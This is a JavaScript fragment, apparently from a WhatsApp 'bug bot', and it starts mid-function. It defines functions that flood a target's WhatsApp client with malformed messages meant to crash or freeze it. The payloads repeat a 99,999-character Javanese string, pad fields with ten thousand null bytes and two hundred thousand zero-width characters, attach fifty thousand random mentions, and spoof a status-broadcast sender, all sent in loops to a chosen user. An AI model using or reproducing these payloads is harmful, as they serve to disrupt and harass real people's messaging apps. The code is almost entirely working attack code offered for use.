                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}




async function SnithNuted(jid) {
  for (let i = 0; i < 50; i++) {
    const params = {
      screen_2_OptIn_0: true,
      screen_2_OptIn_1: true,
      screen_1_Dropdown_0: "Snith        -       Superior",
      screen_1_DatePicker_1: Date.now() + 1000,
      screen_1_TextInput_2: "Snith.Snith@Snith.Snith@xnxx.Snith.Snith@Snith.Snith@xnxx.col",
      screen_1_TextInput_3: "94643116",
      screen_0_TextInput_0: "radio - buttons" + "\u0000".repeat(10000),
      screen_0_TextInput_1: "Anjay",
      screen_0_Dropdown_2: "ętÿśñitĥ      -     Vìņčēŕe",
      screen_0_RadioButtonsGroup_3: "0_true",
      flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
    };

    await ctx.relayMessage(jid, {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "ꦿꦷꦹ".repeat(99999),
            contextInfo: {
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                interactiveResponseMessage: {
                  body: {
                    text: "⛧ 𐍃𐌍𐌉Ƭ𐌂Ή :: CO𐍂Σ ⛧",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: 'galaxy_message',
                    paramsJson: JSON.stringify(params),
                    version: 3
                  }
                }
              }
            }
          }
        }
      }
    }, { participant: { jid: jid }});
    await delay(400); 
  }
}





async function protocolbugv10(target) {
    const mentionedList = Array.from({ length: 50000 }, () => ${Math.floor(Math.random() * 999999)}@s.whatsapp.net);
    const virtex = "🔥 ZYOU KUNTUL 🔥" + "\u2060".repeat(200000);

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { mentionedJid: mentionedList }
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            mediaKeyTimestamp: "1746112211",
            isAnimated: true,
            contextInfo: { mentionedJid: mentionedList }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: virtex,
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(target, { viewOnceMessage: { message: { videoMessage } } }, {});
    const msg2 = generateWAMessageFromContent(target, { viewOnceMessage: { message: stickerMessage } }, {});
    const msg3 = generateWAMessageFromContent(target, audioMessage, {});

    for (const msg of [msg1, msg2, msg3]) {
        await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
    }
}
